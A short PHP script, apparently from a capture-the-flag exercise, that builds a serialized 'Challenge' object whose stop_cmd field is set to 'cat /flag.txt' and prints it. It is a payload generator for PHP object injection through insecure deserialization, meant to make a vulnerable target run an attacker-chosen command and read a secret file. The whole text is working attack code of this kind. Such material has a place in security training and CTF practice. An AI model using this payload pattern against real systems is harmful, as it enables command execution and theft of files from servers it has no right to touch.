<?php
class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd=NULL;
}

$test = new Challenge();
$test->stop_cmd = "cat /flag.txt";
echo(serialize($test));
?>